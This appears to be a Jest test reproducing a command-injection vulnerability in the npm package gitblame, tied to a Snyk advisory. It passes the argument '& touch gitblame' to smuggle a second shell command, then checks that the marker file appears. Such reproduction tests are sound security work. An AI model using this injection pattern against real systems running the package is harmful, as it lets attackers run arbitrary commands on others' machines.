//https://snyk.io/vuln/SNYK-JS-GITBLAME-1050430
test("Command Injection in gitblame", () => {
  const a = require("gitblame");
  const fs = require("fs");
  const path = "./gitblame";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a("& touch gitblame", function () {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
